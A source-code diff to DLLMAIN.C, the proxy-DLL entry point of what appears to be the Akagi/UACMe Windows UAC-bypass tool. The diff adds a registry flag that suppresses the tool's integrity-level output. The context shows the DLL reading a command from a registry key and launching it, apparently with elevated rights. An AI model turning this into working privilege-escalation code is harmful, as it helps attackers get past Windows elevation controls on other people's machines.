@@ -4,9 +4,9 @@
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     2.40
+*  VERSION:     2.50
 *
-*  DATE:        01 July 2016
+*  DATE:        07 July 2016
 *
 *  Proxy dll entry point, Fubuki Kai Ni.
 *
@@ -46,6 +46,15 @@
 
 #define T_AKAGI_KEY    L"Software\\Akagi"
 #define T_AKAGI_PARAM  L"LoveLetter"
+#define T_AKAGI_FLAG   L"Flag"
+
+//default execution flow
+#define AKAGI_FLAG_KILO  0
+
+//suppress all additional output
+#define AKAGI_FLAG_TANGO 1
+
+DWORD g_AkagiFlag;
 
 /*
 * DummyFunc
@@ -55,12 +64,11 @@
 * Stub for fake exports.
 *
 */
-VOID __declspec(dllexport) WINAPI DummyFunc(
+VOID WINAPI DummyFunc(
     VOID
-)
+    )
 {
 }
-
 
 /*
 * ucmShowProcessIntegrityLevel
@@ -72,7 +80,7 @@ VOID __declspec(dllexport) WINAPI DummyFunc(
 */
 void ucmShowProcessIntegrityLevel(
     VOID
-)
+    )
 {
     NTSTATUS status;
     HANDLE hToken;
@@ -145,7 +153,7 @@ BOOL ucmQueryCustomParameter(
     HKEY                    hKey = NULL;
     LPWSTR                  lpParameter = NULL;
     LRESULT                 lRet;
-    DWORD                   dwSize = 0;
+    DWORD                   dwSize = 0, dwType, dwFlag = 0;
     STARTUPINFOW            startupInfo;
     PROCESS_INFORMATION     processInfo;
 
@@ -155,6 +163,16 @@ BOOL ucmQueryCustomParameter(
             break;
         }
 
+        g_AkagiFlag = AKAGI_FLAG_KILO;
+
+        dwType = REG_DWORD;
+        dwSize = sizeof(DWORD);
+        lRet = RegQueryValueExW(hKey, T_AKAGI_FLAG, NULL, &dwType, (LPBYTE)&dwFlag, &dwSize);
+        if (lRet == ERROR_SUCCESS) {
+            g_AkagiFlag = dwFlag;
+        }
+
+        dwSize = 0;
         lRet = RegQueryValueExW(hKey, T_AKAGI_PARAM, NULL, NULL, (LPBYTE)NULL, &dwSize);
         if (lRet != ERROR_SUCCESS) {
             break;
@@ -245,7 +263,10 @@ BOOL WINAPI DllMain(
                 {
                     CloseHandle(processInfo.hProcess);
                     CloseHandle(processInfo.hThread);
-                    ucmShowProcessIntegrityLevel();
+
+                    if (g_AkagiFlag == AKAGI_FLAG_KILO) {
+                        ucmShowProcessIntegrityLevel();
+                    }
                 }
             }
 
